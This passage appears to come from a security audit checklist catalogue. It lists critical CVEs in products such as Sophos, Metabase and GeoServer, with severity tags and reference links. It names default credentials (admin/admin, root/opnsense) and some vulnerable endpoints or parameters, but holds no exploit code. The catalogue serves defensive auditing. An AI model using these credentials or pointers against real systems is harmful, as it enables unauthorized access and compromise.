CVE-2023-32315 allows unauthenticated path traversal to access Openfire admin setup, enabling admin user creation and plugin-based RCE.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32315

---

## Sophos Firewall
<!-- id: sophos | icon: 🛠️ | color: #e06c75 -->
Security checklists for Sophos firewall and UTM security appliances.

### Check Sophos XG Firewall for pre-auth SQL injection RCE (CVE-2020-12271)
<!-- id: sophos-1 | severity: critical | tags: sophos, sqli, rce, cve -->
CVE-2020-12271 is a pre-auth SQL injection in Sophos XG Firewall allowing RCE — actively exploited to deploy backdoors on network perimeters.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12271

### Check Sophos UTM WebAdmin for unauthenticated RCE (CVE-2020-25223)
<!-- id: sophos-2 | severity: critical | tags: sophos-utm, rce, command-injection, cve -->
CVE-2020-25223 allows unauthenticated RCE in Sophos UTM WebAdmin via command injection in the confd endpoint.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25223

---

## FreePBX
<!-- id: freepbx | icon: 🛠️ | color: #e06c75 -->
Security checklists for FreePBX open-source PBX telephony platform.

### Check FreePBX for unauthenticated admin access (CVE-2019-19006)
<!-- id: freepbx-1 | severity: critical | tags: freepbx, rce, cve, voip -->
CVE-2019-19006 allows unauthenticated access to FreePBX admin under certain conditions, enabling full PBX control and RCE via module installation.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19006

---

## CrushFTP
<!-- id: crushftp | icon: 🛠️ | color: #e06c75 -->
Security checklists for CrushFTP enterprise FTP server.

### Check CrushFTP for virtual filesystem escape and auth bypass (CVE-2024-4040)
<!-- id: crushftp-1 | severity: critical | tags: crushftp, auth-bypass, file-read, cve -->
CVE-2024-4040 allows unauthenticated filesystem escape in CrushFTP, enabling arbitrary OS file read and authentication bypass — actively exploited.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4040

---

## IceWarp
<!-- id: icewarp | icon: 🛠️ | color: #e06c75 -->
Security checklists for IceWarp mail and collaboration server.

### Check IceWarp for unauthenticated file upload RCE (CVE-2021-40488)
<!-- id: icewarp-1 | severity: critical | tags: icewarp, rce, file-upload, cve -->
Multiple IceWarp versions are vulnerable to unauthenticated file upload and code execution via the webmail and admin interfaces.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40488

---

## SugarCRM
<!-- id: sugarcrm | icon: 🛠️ | color: #e06c75 -->
Security checklists for SugarCRM customer relationship management platform.

### Check SugarCRM for pre-auth RCE via email template (CVE-2023-22952)
<!-- id: sugarcrm-1 | severity: critical | tags: sugarcrm, rce, email-template, cve -->
CVE-2023-22952 allows unauthenticated RCE in SugarCRM via the email template feature — exploited to deploy webshells and gain persistent access.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22952

---

## OpenEMR
<!-- id: openemr | icon: 🛠️ | color: #e06c75 -->
Security checklists for OpenEMR open-source electronic health record platform.

### Check OpenEMR for authentication bypass and arbitrary file read (CVE-2018-15139)
<!-- id: openemr-1 | severity: critical | tags: openemr, auth-bypass, file-read, cve -->
CVE-2018-15139 allows unauthenticated arbitrary file read in OpenEMR exposing patient records and database credentials.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15139

### Check OpenEMR for exposed patient records (HIPAA/PHI data)
<!-- id: openemr-2 | severity: critical | tags: openemr, hipaa, unauthorized-access, data-exposure -->
OpenEMR without proper authentication exposes highly sensitive patient health records (PHI/HIPAA), violating healthcare compliance regulations.

**References:**
- https://www.open-emr.org/wiki/index.php/Security

---

## ZenTao
<!-- id: zentao | icon: 🛠️ | color: #e06c75 -->
Security checklists for ZenTao project management and bug tracking software.

### Check ZenTao for pre-auth SQL injection and RCE (CVE-2023-46476)
<!-- id: zentao-1 | severity: critical | tags: zentao, sqli, rce, cve -->
Multiple ZenTao versions contain SQL injection in the API allowing unauthenticated credential extraction and Remote Code Execution.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46476

---

## osTicket
<!-- id: osticket | icon: 🛠️ | color: #e06c75 -->
Security checklists for osTicket open-source helpdesk ticketing system.

### Check osTicket for exposed portal leaking internal ticket data
<!-- id: osticket-1 | severity: medium | tags: osticket, info-disclosure, ticket-exposure -->
Misconfigured osTicket portals expose support ticket history, customer emails, and internal communications to unauthenticated visitors.

**References:**
- https://osticket.com/security/

---

## Sitecore
<!-- id: sitecore | icon: 🛠️ | color: #e06c75 -->
Security checklists for Sitecore enterprise content management system.

### Check Sitecore for deserialization RCE (CVE-2021-42237)
<!-- id: sitecore-1 | severity: critical | tags: sitecore, deserialization, rce, cve -->
CVE-2021-42237 allows unauthenticated RCE in Sitecore XP via .NET BinaryFormatter deserialization in Report.ashx — exploited in ransomware attacks.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42237

---

## ColdFusion
<!-- id: coldfusion | icon: 🛠️ | color: #e06c75 -->
Security checklists for Adobe ColdFusion application server.

### Check ColdFusion Administrator for default credentials and RCE
<!-- id: coldfusion-1 | severity: critical | tags: coldfusion, admin, default-creds, rce -->
ColdFusion Administrator at /CFIDE/administrator/ with weak credentials allows direct code execution via ColdFusion Component (CFC) creation.

**References:**
- https://helpx.adobe.com/coldfusion/security-bulletins.html

### Check ColdFusion for unauthenticated deserialization RCE (CVE-2023-29300)
<!-- id: coldfusion-2 | severity: critical | tags: coldfusion, rce, deserialization, cve -->
CVE-2023-29300 is an unauthenticated deserialization flaw in ColdFusion exploited as a zero-day.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-29300

---

## Fuel CMS
<!-- id: fuel-cms | icon: 🛠️ | color: #e06c75 -->
Security checklists for Fuel CMS PHP content management system.

### Check Fuel CMS for eval injection RCE (CVE-2018-16763)
<!-- id: fuelcms-1 | severity: critical | tags: fuel-cms, rce, code-injection, cve -->
CVE-2018-16763 allows unauthenticated RCE in Fuel CMS 1.4.1 via PHP eval injection in pages/select/ — one of the most widely exploited CMS vulnerabilities on Exploit-DB.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16763

---

## Roxy File Manager
<!-- id: roxy-file-manager | icon: 🛠️ | color: #e06c75 -->
Security checklists for Roxy File Manager web-based file management component.

### Check Roxy File Manager for arbitrary file upload RCE
<!-- id: roxy-1 | severity: critical | tags: roxy-file-manager, file-upload, rce -->
Roxy File Manager has known arbitrary file upload vulnerabilities allowing unauthenticated PHP webshell upload, commonly exploited when bundled with CKEditor.

**References:**
- https://www.exploit-db.com/search?q=roxy+file+manager

---

## ADSelfService Plus
<!-- id: adself-service | icon: 🛠️ | color: #e06c75 -->
Security checklists for ManageEngine ADSelfService Plus self-service password reset portal.

### Check ADSelfService Plus for auth bypass leading to RCE (CVE-2021-40539)
<!-- id: adself-1 | severity: critical | tags: adself-service, auth-bypass, rce, cve -->
CVE-2021-40539 is an authentication bypass leading to RCE in ManageEngine ADSelfService Plus — exploited by APT groups to establish persistence in enterprise networks.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40539

---

## Mongo Express
<!-- id: mongo-express | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mongo Express web-based MongoDB admin interface.

### Check Mongo Express for RCE via JavaScript query evaluation (CVE-2019-10758)
<!-- id: mongo-express-1 | severity: critical | tags: mongo-express, rce, query-injection, cve -->
CVE-2019-10758 allows RCE in Mongo Express (unauthenticated in misconfigured instances) via JavaScript evaluation in the query input field.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10758

---

## ZyWALL / Zyxel USG
<!-- id: zywall | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zyxel ZyWALL/USG firewall and VPN appliances.

### Check Zyxel for hardcoded backdoor credentials (CVE-2022-0342)
<!-- id: zywall-1 | severity: critical | tags: zyxel, backdoor, default-creds, cve -->
Multiple Zyxel firewalls contain hardcoded credentials for undocumented admin accounts — actively exploited for unauthorized firewall and VPN access.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0342

---

## Lansweeper
<!-- id: lansweeper | icon: 🛠️ | color: #e06c75 -->
Security checklists for Lansweeper IT asset management platform.

### Check Lansweeper for exposed web console with default credentials
<!-- id: lansweeper-1 | severity: high | tags: lansweeper, default-creds, asset-inventory -->
Lansweeper with default credentials exposes the full network asset inventory — IPs, device types, installed software, and discovered credentials to attackers.

**References:**
- https://www.lansweeper.com/knowledge-base/lansweeper/security-hardening/

---

## rConfig
<!-- id: rconfig | icon: 🛠️ | color: #e06c75 -->
Security checklists for rConfig network device configuration management tool.

### Check rConfig for unauthenticated command injection RCE (CVE-2019-16663)
<!-- id: rconfig-1 | severity: critical | tags: rconfig, rce, command-injection, cve -->
CVE-2019-16663 allows unauthenticated command injection in rConfig, enabling full OS-level Remote Code Execution on the network management server.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16663

---

## Cisco Prime Infrastructure
<!-- id: cisco-prime | icon: 🛠️ | color: #e06c75 -->
Security checklists for Cisco Prime Infrastructure network management platform.

### Check Cisco Prime Infrastructure for unauthenticated file upload RCE (CVE-2019-1821)
<!-- id: cisco-prime-1 | severity: critical | tags: cisco-prime, file-upload, rce, cve -->
CVE-2019-1821 allows unauthenticated RCE in Cisco Prime Infrastructure via arbitrary file upload to the health monitor web interface — CVSS 9.8.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1821

---

## QNAP NAS
<!-- id: qnap | icon: 🛠️ | color: #e06c75 -->
Security checklists for QNAP network-attached storage devices.

### Check QNAP for unauthenticated RCE and ransomware exposure (CVE-2022-27593)
<!-- id: qnap-1 | severity: critical | tags: qnap, rce, file-upload, cve -->
CVE-2022-27593 (DeadBolt) allows unauthenticated RCE on QNAP NAS — exploited by the DeadBolt ransomware group against thousands of devices worldwide.

**References:**
- https://www.qnap.com/en/security-advisory/

---

## elFinder
<!-- id: elfinder | icon: 🛠️ | color: #e06c75 -->
Security checklists for elFinder open-source web file manager.

### Check elFinder for RCE via archive extraction (CVE-2021-32682)
<!-- id: elfinder-1 | severity: critical | tags: elfinder, rce, file-upload, php-connector, cve -->
CVE-2021-32682 allows RCE in elFinder by uploading a zip containing a PHP webshell that gets extracted by the connector's archive handler.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32682

---

## Apache Airflow
<!-- id: airflow | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache Airflow workflow orchestration platform.

### Check Airflow for exposed web UI and default credentials
<!-- id: airflow-1 | severity: high | tags: airflow, default-creds, dag-execution -->
Airflow web UI at port 8080 with default credentials (admin/admin) exposes all DAGs, stored connection strings (database creds, API keys), and allows triggering code execution.

**References:**
- https://airflow.apache.org/docs/apache-airflow/stable/security/

### Check Airflow for RCE via DAG code injection
<!-- id: airflow-2 | severity: critical | tags: airflow, rce, dag, code-execution -->
Authenticated Airflow users who can create or modify DAGs execute arbitrary Python code on Airflow worker nodes and the scheduler host.

**References:**
- https://airflow.apache.org/docs/apache-airflow/stable/security/access-control.html

---

## Aviatrix Cloud Controller
<!-- id: aviatrix | icon: 🛠️ | color: #e06c75 -->
Security checklists for Aviatrix cloud networking controller.

### Check Aviatrix for unauthenticated file upload RCE (CVE-2021-40870)
<!-- id: aviatrix-1 | severity: critical | tags: aviatrix, rce, file-upload, cve -->
CVE-2021-40870 allows unauthenticated file upload and RCE in Aviatrix Controller — weaponized quickly after disclosure and used against cloud environments.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40870

---

## Pandora FMS
<!-- id: pandora-fms | icon: 🛠️ | color: #e06c75 -->
Security checklists for Pandora FMS network monitoring platform.

### Check Pandora FMS for SQL injection and RCE (CVE-2020-5840)
<!-- id: pandorafms-1 | severity: critical | tags: pandora-fms, sqli, rce, cve -->
Multiple Pandora FMS versions contain SQL injection allowing unauthenticated database access and code execution via the monitoring console.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5840

---

## VoIPmonitor
<!-- id: voipmonitor | icon: 🛠️ | color: #e06c75 -->
Security checklists for VoIPmonitor open-source VoIP monitoring software.

### Check VoIPmonitor for pre-auth SQL injection and RCE (CVE-2021-30461)
<!-- id: voipmonitor-1 | severity: critical | tags: voipmonitor, rce, sql-injection, cve -->
CVE-2021-30461 allows unauthenticated SQL injection and RCE in VoIPmonitor web interface — actively exploited to deploy cryptominers.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30461

---

## JumpServer
<!-- id: jumpserver | icon: 🛠️ | color: #e06c75 -->
Security checklists for JumpServer open-source bastion host and PAM system.

### Check JumpServer for unauthenticated RCE (CVE-2023-42820)
<!-- id: jumpserver-1 | severity: critical | tags: jumpserver, rce, auth-bypass, cve -->
CVE-2023-42820 and related vulnerabilities allow unauthenticated attackers to reset JumpServer admin passwords and execute commands on managed assets.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-42820

---

## OpenAM
<!-- id: openam | icon: 🛠️ | color: #e06c75 -->
Security checklists for ForgeRock OpenAM identity management platform.

### Check OpenAM for pre-auth deserialization RCE (CVE-2021-35464)
<!-- id: openam-1 | severity: critical | tags: openam, rce, deserialization, cve -->
CVE-2021-35464 allows unauthenticated RCE in OpenAM via Java deserialization in the Jato framework — exploited in supply chain attacks against enterprise SSO systems.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35464

---

## Metabase
<!-- id: metabase | icon: 🛠️ | color: #e06c75 -->
Security checklists for Metabase business intelligence and analytics platform.

### Check Metabase for pre-auth RCE via setup token (CVE-2023-38646)
<!-- id: metabase-1 | severity: critical | tags: metabase, rce, setup-token, cve -->
CVE-2023-38646 allows unauthenticated RCE in Metabase via /api/setup/validate using a leaked setup token — massively exploited within days of disclosure.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38646

---

## Casdoor
<!-- id: casdoor | icon: 🛠️ | color: #e06c75 -->
Security checklists for Casdoor open-source SSO and identity management system.

### Check Casdoor for unauthenticated SQL injection (CVE-2022-24124)
<!-- id: casdoor-1 | severity: critical | tags: casdoor, sqli, unauthorized-access, cve -->
CVE-2022-24124 allows unauthenticated SQL injection in Casdoor via /api/get-organizations, leaking all user credentials and organization data.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24124

---

## FortiNAC
<!-- id: fortinac | icon: 🛠️ | color: #e06c75 -->
Security checklists for Fortinet FortiNAC network access control.

### Check FortiNAC for unauthenticated file upload RCE (CVE-2022-39952)
<!-- id: fortinac-1 | severity: critical | tags: fortinac, rce, file-upload, cve -->
CVE-2022-39952 (CVSS 9.8) allows unauthenticated file upload to any path on the FortiNAC filesystem, enabling persistent RCE via cron job or webshell.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39952

---

## Tenda Router
<!-- id: tenda | icon: 🛠️ | color: #e06c75 -->
Security checklists for Tenda home and SOHO routers.

### Check Tenda for command injection and stack overflow (CVE-2020-10987)
<!-- id: tenda-1 | severity: critical | tags: tenda, command-injection, rce, iot, cve -->
Multiple Tenda router models contain command injection and stack overflow vulnerabilities in web management interfaces — frequently targeted by Mirai botnet variants.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10987

---

## KubeView
<!-- id: kubeview | icon: 🛠️ | color: #e06c75 -->
Security checklists for KubeView Kubernetes cluster visualization tool.

### Check KubeView for unauthenticated Kubernetes API data exposure
<!-- id: kubeview-1 | severity: high | tags: kubeview, kubernetes, unauthorized-access, info-disclosure -->
KubeView without authentication proxies Kubernetes API responses to the browser, exposing all pod names, namespaces, service IPs, and cluster topology.

**References:**
- https://github.com/benc-uk/kubeview/security

---

## CloudPanel
<!-- id: cloudpanel | icon: 🛠️ | color: #e06c75 -->
Security checklists for CloudPanel server management panel.

### Check CloudPanel for privilege escalation via SQLite injection (CVE-2023-35885)
<!-- id: cloudpanel-1 | severity: critical | tags: cloudpanel, privilege-escalation, sqlite, cve -->
CVE-2023-35885 allows authenticated CloudPanel users to escalate to root by injecting malicious commands via SQLite configuration manipulation.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-35885

---

## Mirth Connect
<!-- id: mirth-connect | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mirth Connect healthcare integration engine (HL7/FHIR).

### Check Mirth Connect for unauthenticated Java deserialization RCE (CVE-2023-43208)
<!-- id: mirth-1 | severity: critical | tags: mirth-connect, rce, deserialization, cve, healthcare -->
CVE-2023-43208 allows unauthenticated RCE in Mirth Connect via Java deserialization — critical in healthcare environments handling patient data and HL7 messages.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43208

---

## OPNsense
<!-- id: opnsense | icon: 🛠️ | color: #e06c75 -->
Security checklists for OPNsense open-source firewall and routing platform.

### Check OPNsense for exposed management UI with default credentials
<!-- id: opnsense-1 | severity: high | tags: opnsense, default-creds, management, firewall -->
OPNsense web UI at port 443 with default credentials (root/opnsense) grants full firewall management, traffic inspection, and VPN configuration access.

**References:**
- https://docs.opnsense.org/

---

## Qlik Sense
<!-- id: qlik-sense | icon: 🛠️ | color: #e06c75 -->
Security checklists for Qlik Sense business intelligence platform.

### Check Qlik Sense for path traversal and HTTP tunneling RCE (CVE-2023-41265)
<!-- id: qlik-1 | severity: critical | tags: qlik-sense, rce, path-traversal, cve -->
CVE-2023-41265 and CVE-2023-41266 allow unauthenticated path traversal and HTTP tunneling in Qlik Sense — actively exploited by the Cactus ransomware group.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-41265

---

## ServiceNow
<!-- id: servicenow | icon: 🛠️ | color: #e06c75 -->
Security checklists for ServiceNow IT service management platform.

### Check ServiceNow for unauthenticated input validation bypass (CVE-2024-4879)
<!-- id: servicenow-1 | severity: critical | tags: servicenow, auth-bypass, data-exposure, cve -->
CVE-2024-4879 allows unauthenticated bypass of UI macro input validation in ServiceNow, potentially exposing sensitive ITSM data including incident tickets.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4879

---

## Uptime Kuma
<!-- id: uptime-kuma | icon: 🛠️ | color: #e06c75 -->
Security checklists for Uptime Kuma self-hosted monitoring tool.

### Check Uptime Kuma for unauthenticated SSRF via monitor URLs
<!-- id: uptime-kuma-1 | severity: high | tags: uptime-kuma, ssrf, unauthorized-access -->
Uptime Kuma without authentication allows adding monitors pointing to internal services, enabling SSRF to enumerate internal network endpoints.

**References:**
- https://github.com/louislam/uptime-kuma/security/advisories

---

## Maltrail
<!-- id: maltrail | icon: 🛠️ | color: #e06c75 -->
Security checklists for Maltrail malicious traffic detection system.

### Check Maltrail for unauthenticated OS command injection (CVE-2023-27163)
<!-- id: maltrail-1 | severity: critical | tags: maltrail, rce, command-injection, cve -->
CVE-2023-27163 allows unauthenticated OS command injection in Maltrail's login form via the username parameter — trivially exploitable with a single curl command.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27163

---

## Gogs
<!-- id: gogs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gogs self-hosted Git service.

### Check Gogs for argument injection and RCE (CVE-2024-39930)
<!-- id: gogs-1 | severity: critical | tags: gogs, rce, argument-injection, cve -->
Multiple Gogs versions contain argument injection in repository management allowing authenticated users to achieve Remote Code Execution on the server.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-39930

---

## Gitblit
<!-- id: gitblit | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gitblit open-source Git repository manager.

### Check Gitblit for exposed admin access with default credentials
<!-- id: gitblit-1 | severity: high | tags: gitblit, admin, default-creds, source-code -->
Gitblit admin panel with default credentials (admin/admin) exposes all repositories and allows creating persistent admin accounts.

**References:**
- https://gitblit.github.io/gitblit/administration.html

---

## GLPI
<!-- id: glpi | icon: 🛠️ | color: #e06c75 -->
Security checklists for GLPI IT asset management and helpdesk platform.

### Check GLPI for unauthenticated SQL injection (CVE-2021-39211)
<!-- id: glpi-1 | severity: critical | tags: glpi, sqli, unauthorized-access, cve -->
CVE-2021-39211 and related bugs allow unauthenticated SQL injection in GLPI, exposing all user credentials and IT asset data.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39211

### Check GLPI for exposed /install directory post-deployment
<!-- id: glpi-2 | severity: high | tags: glpi, install, misconfiguration -->
GLPI's /install/ directory left accessible after deployment allows database reinitialisation and admin credential reset.

**References:**
- https://glpi-project.org/security/

---

## ownCloud
<!-- id: owncloud | icon: 🛠️ | color: #e06c75 -->
Security checklists for ownCloud self-hosted file sharing and collaboration platform.

### Check ownCloud for pre-auth credential disclosure (CVE-2023-49103)
<!-- id: owncloud-1 | severity: critical | tags: owncloud, credential-disclosure, env, cve -->
CVE-2023-49103 (CVSS 10.0) exposes ownCloud admin passwords, mail server credentials, and license keys via an unauthenticated phpinfo endpoint.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49103

### CVE-2023-49104 — OAuth2 subdomain validation bypass (High)
<!-- id: owncloud-cve-2023-49104 | severity: high | tags: owncloud, cve, oauth2, subdomain-bypass -->
Vulnerable: ownCloud OAuth2 app before 0.6.1. The OAuth2 library used by ownCloud does not properly validate redirect URIs, allowing attackers to steal authorization codes by crafting redirect URIs with attacker-controlled subdomains.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49104

---

## Apache OFBiz
<!-- id: ofbiz | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache OFBiz enterprise resource planning framework.

### Check OFBiz for pre-auth RCE via request handler bypass (CVE-2024-45195)
<!-- id: ofbiz-1 | severity: critical | tags: ofbiz, rce, auth-bypass, cve -->
CVE-2024-45195 allows direct request handler bypass in Apache OFBiz leading to unauthenticated code execution — multiple critical CVEs have affected OFBiz in recent years.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-45195

---

## GeoServer
<!-- id: geoserver | icon: 🛠️ | color: #e06c75 -->
Security checklists for GeoServer open-source geospatial data server.

### Check GeoServer for unauthenticated RCE via OGC filter evaluation (CVE-2024-36401)
<!-- id: geoserver-1 | severity: critical | tags: geoserver, rce, ognl, cve -->
CVE-2024-36401 allows unauthenticated RCE in GeoServer via OGC request filter evaluation using property names as XPath expressions — massively exploited in the wild.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36401

---

## Piwigo
<!-- id: piwigo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Piwigo open-source photo gallery web application.

### Check Piwigo for SQL injection (CVE-2021-26615)
<!-- id: piwigo-1 | severity: high | tags: piwigo, sqli, cve -->
Piwigo has recurring SQL injection vulnerabilities in search and admin parameters allowing database extraction.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26615

---

## Bludit
<!-- id: bludit | icon: 🛠️ | color: #e06c75 -->
Security checklists for Bludit flat-file CMS.

### Check Bludit for brute-force bypass and PHP file upload RCE
<!-- id: bludit-1 | severity: critical | tags: bludit, brute-force-bypass, rce, file-upload -->
Bludit's IP-based brute-force protection is bypassed via X-Forwarded-For spoofing. Authenticated users can upload PHP files disguised as images for RCE.

**References:**
- https://www.exploit-db.com/search?q=bludit

---

## NodeBB
<!-- id: nodebb | icon: 🛠️ | color: #e06c75 -->
Security checklists for NodeBB open-source Node.js forum software.

### Check NodeBB for prototype pollution and stored XSS (CVE-2023-26045)
<!-- id: nodebb-1 | severity: high | tags: nodebb, prototype-pollution, xss, cve -->
NodeBB has been affected by prototype pollution vulnerabilities enabling stored XSS and potential privilege escalation.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26045

---

## ChurchCRM
<!-- id: churchcrm | icon: 🛠️ | color: #e06c75 -->
Security checklists for ChurchCRM open-source church management system.

### Check ChurchCRM for SQL injection (CVE-2023-26978)
<!-- id: churchcrm-1 | severity: high | tags: churchcrm, sqli, cve -->
Multiple ChurchCRM versions contain SQL injection in authenticated endpoints allowing full database extraction including member personal data.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26978

---

## Liferay
<!-- id: liferay | icon: 🛠️ | color: #e06c75 -->
Security checklists for Liferay Portal enterprise content and collaboration platform.

### Check Liferay for unauthenticated JSON deserialization RCE (CVE-2020-7961)
<!-- id: liferay-1 | severity: critical | tags: liferay, rce, deserialization, cve -->
CVE-2020-7961 allows unauthenticated RCE in Liferay Portal via JSON deserialization — commonly deployed as corporate intranets and extranets.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7961

---

## Contao
<!-- id: contao | icon: 🛠️ | color: #e06c75 -->
Security checklists for Contao open-source CMS.

### Check Contao for path traversal and unauthorized file access
<!-- id: contao-1 | severity: medium | tags: contao, path-traversal, file-access -->
Contao CMS has historically had vulnerabilities allowing authenticated users to traverse directory structures and access files outside the web root.

**References:**
- https://contao.org/en/security-advisories.html

---

## Pterodactyl
<!-- id: pterodactyl | icon: 🛠️ | color: #e06c75 -->
Security checklists for Pterodactyl open-source game server management panel.

### Check Pterodactyl for exposed admin panel and API token leakage
<!-- id: pterodactyl-1 | severity: high | tags: pterodactyl, admin, api-token, rce -->
Pterodactyl with weak credentials or leaked API tokens allows full game server management, enabling container escape and code execution on underlying nodes.

**References:**
- https://pterodactyl.io/project/security.html

---

## MikoPBX
<!-- id: mikopbx | icon: 🛠️ | color: #e06c75 -->
Security checklists for MikoPBX open-source PBX telephony system.

### Check MikoPBX for command injection via network configuration fields
<!-- id: mikopbx-1 | severity: critical | tags: mikopbx, command-injection, default-creds, voip -->
MikoPBX web interface with default credentials or command injection in configuration fields leads to full telephony infrastructure compromise.

**References:**
- https://github.com/mikopbx/Core/security/advisories

---

## Apache SkyWalking
<!-- id: skywalking | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache SkyWalking application performance monitoring platform.

### Check SkyWalking for GraphQL SQL injection RCE (CVE-2020-9483)
<!-- id: skywalking-1 | severity: critical | tags: skywalking, sqli, rce, graphql, cve -->
CVE-2020-9483 allows unauthenticated SQL injection in Apache SkyWalking's H2/MySQL backend via GraphQL queries, leading to data exposure and potential RCE.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9483

---

## D-Link Routers
<!-- id: dlink | icon: 🛠️ | color: #e06c75 -->
Security checklists for D-Link home and enterprise network devices.

### Check D-Link for unauthenticated command injection (CVE-2019-16920)
<!-- id: dlink-1 | severity: critical | tags: dlink, command-injection, rce, iot, cve -->
Multiple D-Link routers contain unauthenticated command injection in the ping test functionality — widely targeted by Mirai botnet variants.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16920

### Check D-Link for hardcoded backdoor credentials
<!-- id: dlink-2 | severity: critical | tags: dlink, backdoor, default-creds, iot -->
Several D-Link device models have contained hardcoded admin credentials and undocumented telnet/SSH backdoor accounts discoverable via firmware analysis.

**References:**
- https://www.exploit-db.com/search?q=d-link

---

## Netgear
<!-- id: netgear | icon: 🛠️ | color: #e06c75 -->
Security checklists for Netgear home and small business routers and switches.

### Check Netgear for unauthenticated command injection (CVE-2021-45732)
<!-- id: netgear-1 | severity: critical | tags: netgear, command-injection, rce, iot, cve -->
Multiple Netgear router models contain unauthenticated command injection in web management interfaces enabling full router compromise.

**References:**
- https://kb.netgear.com/000065435/

---

## Home Assistant
<!-- id: home-assistant | icon: 🛠️ | color: #e06c75 -->
Security checklists for Home Assistant open-source home automation platform.

### Check Home Assistant for exposed instance without authentication
<!-- id: homeassistant-1 | severity: high | tags: home-assistant, unauthorized-access, iot, smart-home -->
Home Assistant without a password exposed on the internet allows controlling all connected smart home devices — locks, cameras, alarms, and thermostats.

**References:**
- https://www.home-assistant.io/docs/authentication/

---

## Traefik
<!-- id: traefik | icon: 🛠️ | color: #e06c75 -->
Security checklists for Traefik cloud-native reverse proxy and load balancer.

### Check Traefik dashboard for unauthenticated access
<!-- id: traefik-1 | severity: high | tags: traefik, dashboard, info-disclosure, unauthorized-access -->
Traefik dashboard without authentication exposes all configured routes, services, middleware, and TLS certificate information — a complete infrastructure map.

**References:**
- https://doc.traefik.io/traefik/operations/dashboard/#secure-mode

### Check Traefik for Docker socket exposure enabling container escape
<!-- id: traefik-2 | severity: critical | tags: traefik, docker-socket, container-escape, rce -->
Traefik configured with direct Docker socket access (/var/run/docker.sock) can create privileged containers, leading to full host OS compromise.

**References:**
- https://doc.traefik.io/traefik/providers/docker/

---

## IBM ODM
<!-- id: ibm-odm | icon: 🛠️ | color: #e06c75 -->
Security checklists for IBM Operational Decision Manager business rules platform.

### Check IBM ODM Decision Center for default credentials
<!-- id: ibm-odm-1 | severity: high | tags: ibm-odm, admin, default-creds, business-rules -->
IBM ODM Decision Center and RES console with default credentials (odmAdmin/odmAdmin) expose and allow modification of all business rule logic.

**References:**
- https://www.ibm.com/docs/en/odm/8.10.0?topic=security-securing-decision-center

---

## GoAnywhere MFT
<!-- id: goanywhere | icon: 🛠️ | color: #e06c75 -->
Security checklists for Fortra GoAnywhere Managed File Transfer platform.

### Check GoAnywhere for pre-auth deserialization RCE (CVE-2023-0669)
<!-- id: goanywhere-1 | severity: critical | tags: goanywhere, rce, deserialization, cve -->
